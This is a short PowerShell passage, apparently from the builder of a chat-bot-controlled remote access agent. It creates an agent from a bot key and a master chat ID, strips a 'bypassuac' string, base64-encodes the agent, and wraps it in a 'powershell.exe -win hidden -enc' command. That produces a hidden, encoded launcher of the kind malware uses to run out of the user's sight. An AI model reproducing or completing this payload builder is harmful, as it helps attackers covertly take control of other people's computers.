...
$agent_bot = create_agent -botkey $botkey -chat_id $bot_Master_ID;  $agent_bot = $agent_bot -replace "con bypassuac :D","" ; $code = code_a_base64 -code $agent_bot; $code = "powershell.exe -win hidden -enc " + $code
